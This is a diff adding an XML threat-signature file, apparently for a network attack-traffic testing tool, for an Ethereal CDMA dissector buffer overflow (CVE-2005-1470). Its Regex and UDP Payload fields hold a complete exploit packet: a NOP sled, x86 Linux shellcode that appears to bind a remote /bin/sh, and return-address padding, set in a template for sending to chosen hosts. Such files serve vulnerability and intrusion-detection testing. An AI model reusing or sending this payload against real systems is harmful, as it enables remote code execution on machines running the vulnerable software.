@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ethereal CDMA Buffer Overflow"/>
+    <EngDesc display="true" value="This threat sends out a malicious packet intended to cause a buffer overflow in the Ethereal protocol dissector.  This can be used to cause remote code to execute on a machine."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="3GPP2"/>
+    <Type_Of_Equipment display="true">
+      <item value="Sniffer"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Ethereal_10.9"/>
+      <item value="Ethereal_10.8"/>
+      <item value="Ethereal_10.7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://security.lss.hr/en/index.php?page=details&amp;ID=LSS-2005-03-04"/>
+    <CVEID display="true" value="CVE-2005-1470"/>
+    <bugtraqID display="true" value="13504"/>
+    <OSVDB display="true" value="14755"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000102d326909700c000a80001003c5f497689"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725888482187500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X01\X0A\XFF\XFF\X00\X00\X00\X00\XF0\X00\XBA\X00\X00\X00\X00\X00\XDE\XAD\XBE\XEF\XD0\X00\X00\X0D\X26\X00\XFF\XFF\X00\X00\X00\X00\X01\X01\X1A\XFF\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X31\XC0\X89\X45\X10\X40\X89\XC3\X89\X45\X0C\X40\X89\X45\X08\X8D\X4D\X08\XB0\X66\XCD\X80\X89\X45\X08\X43\X89\X5D\X14\X66\XC7\X45\X16\X03\X09\X31\XC0\X89\X45\X18\X8D\X55\X14\X89\X55\X0C\XC6\X45\X10\X10\XB0\X66\XCD\X80\X40\X89\X45\X0C\X43\X43\XB0\X66\XCD\X80\X43\X89\X45\X0C\X89\X45\X10\XB0\X66\XCD\X80\X89\XC3\X31\XC9\XB0\X3F\XCD\X80\X41\XB0\X3F\XCD\X80\X41\XB0\X3F\XCD\X80\XEB\X1A\X5E\X31\XC0\X88\X46\X07\X8D\X1E\X89\X5E\X08\X89\X46\X0C\XB0\X0B\X89\XF3\X8D\X4E\X08\X8D\X56\X0C\XCD\X80\XE8\XE1\XFF\XFF\XFF\X2F\X62\X69\X6E\X2F\X73\X68\X54\X52\X4F\X45\X50\X4A\X55\X48\X53\X1F\XFE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE\XAD\XDE\XEF\XBE"/>
+    <Created value="1139461993" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="023D" Identification="@random(0, FFFF)" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="CAD1" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026, 65535)" destPort="$destPort" checksum="5062" length="0229" Payload="010AFFFF00000000F000BA0000000000DEADBEEFD000000D2600FFFF0000000001011AFF90909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C08945104089C389450C408945088D4D08B066CD8089450843895D1466C74516030931C08945188D551489550CC6451010B066CD804089450C4343B066CD804389450C894510B066CD8089C331C9B03FCD8041B03FCD8041B03FCD80EB1A5E31C08846078D1E895E0889460CB00B89F38D4E088D560CCD80E8E1FFFFFF2F62696E2F736854524F45504A5548531FFEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBEADDEEFBE"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
